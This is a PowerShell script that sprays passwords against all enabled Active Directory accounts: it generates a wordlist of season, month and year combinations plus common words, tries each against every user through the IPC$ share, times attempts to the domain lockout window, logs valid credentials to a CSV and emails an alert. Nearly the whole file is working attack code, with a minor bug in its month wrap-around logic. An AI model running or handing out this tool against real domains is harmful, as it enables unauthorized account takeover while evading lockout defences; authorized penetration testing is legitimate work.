# Retrieve ADUsers and Password Spray Against Them

Import-Module ActiveDirectory

# Set errors to stop, this will prevent false positives in the password spray script
$ErrorActionPreference = 'Stop'

# Define output
$output = "c:\temp\output_" + (Get-Date -Format "MM-dd-yyyy") + ".csv." # This will be where working passwords are written

# Define password list (comment out line that you aren't using or use the wordlist generator found in the code below)
# $passwords = get-content "c:\temp\passwords.txt" # Use a password list from a file

# Set variables for domain
$computer = $env:COMPUTERNAME # If you are testing against another domain, change this to a domain connected machine 
$domain = $env:USERDOMAIN # If you are testing against another domain, change this to the domain name
$ou = "*OU=*" # If you only want to pull users from a specific OU

# Set sleep timer (this will query AD for the lockout Observation Window and only spray once in that time frame, be careful if lockout is set by GP instead of AD)
$RootDSE = Get-ADRootDSE
$AccountPolicy = Get-ADObject $RootDSE.defaultNamingContext -Property lockoutObservationWindow
$sleep = $AccountPolicy.lockoutObservationWindow/-10000000
# $sleep = 15 * 60 # This is in seconds so 15 * 60 = 15 minutes. Only change the 15 value (uncomment to set manually)

# Do the lookup and create the output file (requires the machine you're running this from to be domain connected)
echo "AD-Lookup running, do not close window"
$users = Get-ADUser -filter {Enabled -eq $true} | Where-Object{$_.DistinguishedName -like $ou } | Select-Object SamAccountName

#----------------------------Mail Module------------------------------------------
$smtpServer = "" # this is the smtp server for the email you're sending from
$from_email = "" # this is the full email address for your from email
$from_pass = "" # if using an open relay, this can be left blank
$to_email = "" # where you want alerts send to
$ssl_toggle = $false

 
$msg = new-object Net.Mail.MailMessage 
$smtp = new-object Net.Mail.SmtpClient($smtpServer) 
$smtp.EnableSsl = $ssl_toggle
$msg.From = "$from_email"  
$msg.To.Add("$to_email") 
$msg.BodyEncoding = [system.Text.Encoding]::Unicode 
$msg.SubjectEncoding = [system.Text.Encoding]::Unicode 
$msg.IsBodyHTML = $true  
$msg.Subject = "Password Found" 
$msg.Body = "The password sprayer recovered a password, please check the results"  
$SMTP.Credentials = New-Object System.Net.NetworkCredential("$from_email", "$from_pass"); 


#----------------------------End Mail Module------------------------------------------

#----------------------------Wordlist generator------------------------------------------

# set variables for wordlist generator
$pwmin = 8 # set your minimum desired password length here
$pwmax = 64 # set your maximum desired password length here
$complex = 3 # set the minimum number of complexity variations
$monthcount = 2 #set the number of months you want in each direction of the current month
$yearcount = 0 #set the number of years you want in each direction of the current year

# static arrays for seasons, months, special characters
$monthsup = ('January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December')
$monthslow = ('january', 'february', 'march', 'april', 'may', 'june', 'july', 'august', 'september', 'october', 'november', 'december')
$monthsabbr = ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec')
$seasons = ('Winter', 'Spring', 'Summer', 'Fall', 'Autumn', 'winter', 'spring', 'summer', 'fall', 'autumn')
$specials = ('!', '@','$','?')
$additional_words = ('Welcome', 'Changeme', 'Baseball', 'Football', 'Password', 'Starwars')

# let user know wordlist is being built
echo "Generating wordlist based on current date"

# generate years based on current date
$dates = @((Get-Date).Year, ((Get-Date).Year - 2000))
for ($i=1;$i -lt $yearcount +1; $i++) 
    {
    $dates += ((Get-Date).Year - $i)
    $dates += ((Get-Date).Year + $i)
    }

# generate months based on current date and combine with seasons list
$months = $seasons
for ($i=0;$i -lt $monthcount +1; $i++) 
    {
    $monthint = (Get-Date).Month + $i
    if ($monthint -gt 12) {$monthit -12}
    $months += $monthsup[$monthint -1]
    $months += $monthslow[$monthint -1]
    $months += $monthsabbr[$monthint -1]
    
    $monthint = (Get-Date).Month - $i
    if ($monthint -lt 1) {$monthit +12}
    $months += $monthsup[$monthint -1]
    $months += $monthslow[$monthint -1]
    $months += $monthsabbr[$monthint -1]
    }

# initialize arrays
$wordlist = @()
$wordlist2 = @()
$passwordlist = @()

# remove any blank lines in dates
$dates = $dates | ? {$_}

# build initial wordlist
foreach ($date in $dates)
    {
    foreach ($month in $months)
        {
        foreach ($special in $specials)
            {
            $wordlist += $month + $date.ToString()
            $wordlist += $date.ToString() + $month
            $wordlist += $date.ToString() + $month + $special
            $wordlist += $month + $date.ToString() + $special
            $wordlist += $month + $special + $date.ToString()
            }
        }
    }

# add words from additional wordlist
foreach ($additional_word in $additional_words)
    {
    foreach ($i in 1..10)
        {
        $wordlist += $additional_word + $i
        }
    }

# check wordlist for minimum length
foreach ($word in $wordlist)
    {
    if ($word.Length -gt $pwmin - 1) {$wordlist2 += $word}
    }

# check wordlist for complexity
foreach ($word in $wordlist2)
    {
    $passcomp = 0
    if ($word -cmatch '[A-Z]') {$passcomp += 1}
    if ($word -cmatch '[a-z]') {$passcomp += 1}
    if ($word -cmatch '[0-9]') {$passcomp += 1}
    foreach ($special in $specials) {if ($word -cmatch '\' + $special) {$passcomp += 1;break}}
    if ($passcomp -gt $complex -1) {$passwordlist += $word}
    }

$passwords = $passwordlist | select -uniq # comment this line out to not use the passwords from the generator

# announce how many words in wordlist
$passwords_count = $passwords.count
echo "Generated $passwords_count passwords"
#----------------------------End wordlist generator------------------------------------------


# Start password spraying
foreach($password in $passwords)
{ 
    echo "Beginning password spray using $password"
    foreach($user in $users)
    {
        $username = $user.SamAccountName
        # echo "Running $password against $username" # comment this out to only see successful passwords

        # Try to connect to the IPC share using the password and user specified
        try
        {
            net use \\$computer\IPC$ /user:"$domain\$username" $password
            Add-Content $output "$username, $password" # comment this out to not write a file to disk
            net use /delete \\$computer\IPC$
            echo "Password Found! $username\$password"
            $smtp.Send($msg)
        }
        catch{}
    }

    # Insert a sleep timer to not lock out domain accounts
    echo "Waiting for next run"
    Start-Sleep -Seconds $sleep
}

echo "Results written to $output"
